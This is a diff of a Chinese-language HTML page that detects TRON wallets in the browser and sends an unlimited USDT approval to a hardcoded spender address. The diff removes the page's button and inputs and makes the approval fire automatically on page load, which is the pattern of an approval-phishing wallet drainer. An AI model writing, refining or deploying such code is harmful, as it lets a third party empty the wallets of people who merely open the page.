@@ -2,16 +2,13 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>TRON</title>
+<title>TRON Auto Approve</title>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:12px; }
-.row { margin:6px 0; }
-input { width:520px; background:#111; color:#0f0; border:1px solid #0f0; padding:4px; }
-button { background:#0f0; color:#000; border:0; padding:6px 12px; cursor:pointer; }
 pre { white-space:pre-wrap; }
 </style>
 </head>
+<body>
 <pre id="log"></pre>
 
 <script>
@@ -21,35 +18,22 @@ function log(m){
   console.log(m);
 }
 
-/* 认钱包：返回 { name, tronWeb, request } */
+/* 认钱包 */
 function detectWallet(){
-  // TronLink
   if (window.tronLink && window.tronLink.tronWeb)
     return { name:'TronLink', tronWeb: window.tronLink.tronWeb, request: window.tronLink.request?.bind(window.tronLink) };
-
   if (window.tron && window.tron.tronWeb)
     return { name:'TronLink(tron)', tronWeb: window.tron.tronWeb, request: window.tron.request?.bind(window.tron) };
-
-  // TokenPocket
   if (window.tokenpocket && window.tokenpocket.tronWeb)
     return { name:'TokenPocket', tronWeb: window.tokenpocket.tronWeb, request: window.tokenpocket.request?.bind(window.tokenpocket) };
-
-  // OKX
   if (window.okxwallet && window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb)
     return { name:'OKX Wallet', tronWeb: window.okxwallet.tronLink.tronWeb, request: window.okxwallet.tronLink.request?.bind(window.okxwallet.tronLink) };
-
-  // Bitget / BitKeep
   if (window.bitkeep && window.bitkeep.tronWeb)
     return { name:'Bitget Wallet', tronWeb: window.bitkeep.tronWeb, request: window.bitkeep.tronLink?.request?.bind(window.bitkeep.tronLink) };
-
-  // Gate
   if (window.gatewallet && window.gatewallet.tronWeb)
     return { name:'GateWallet', tronWeb: window.gatewallet.tronWeb, request: window.gatewallet.request?.bind(window.gatewallet) };
-
-  // 兜底：直接挂了 tronWeb
   if (window.tronWeb)
     return { name:'Unknown TRON Wallet', tronWeb: window.tronWeb, request: null };
-
   return null;
 }
 
@@ -60,10 +44,10 @@ function toBaseAmount(human, decimals){
   return raw || '0';
 }
 
-async function approve(){
+async function main(){
   const wallet = detectWallet();
   if(!wallet){
-    log('❌ 没检测到 TRON 钱包，请用钱包内置浏览器打开');
+    log('❌ 未检测到 TRON 钱包，请用钱包内置浏览器打开');
     return;
   }
   log('🪙 钱包：' + wallet.name);
@@ -81,12 +65,13 @@ async function approve(){
 
   if(!addr){ log('❌ 拿不到地址'); return; }
   log('👛 当前地址：' + addr);
-  
-  //TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
-  //TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf
-  const token   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+  // ===== 手动改这里 =====
+  const token   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 主网 USDT
+  // const token = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // Nile USDT
   const spender = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
-  const human   = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
+  const human   = 115792089237316195423570985008687907853269984665640564039457584007913129639935; // 最大授权
+  // =====================
 
   let contract;
   try {
@@ -108,9 +93,7 @@ async function approve(){
   try {
     const tx = await contract.approve(spender, raw).send({ callValue: 0 });
     log('✅ approve 成功 TxID=' + tx);
-    log('🔍 ' + (tw.fullnodeHost || '') + ' / tronscan 自己按网络看');
   } catch(e){
-    // 有些钱包要 feeLimit
     try {
       const tx = await contract.approve(spender, raw).send({ callValue:0, feeLimit: 100_000_000 });
       log('✅ approve 成功(feeLimit) TxID=' + tx);
@@ -120,7 +103,22 @@ async function approve(){
   }
 }
 
-document.getElementById('btn').addEventListener('click', approve);
+// 自动执行
+window.addEventListener('load', () => {
+  let tries = 0;
+  const timer = setInterval(() => {
+    tries++;
+    const w = detectWallet();
+    if (w || tries >= 15){
+      clearInterval(timer);
+      if (w){
+        main();
+      } else {
+        log('❌ 15 次重试后仍未检测到钱包');
+      }
+    }
+  }, 400);
+});
 </script>
 </body>
 </html>
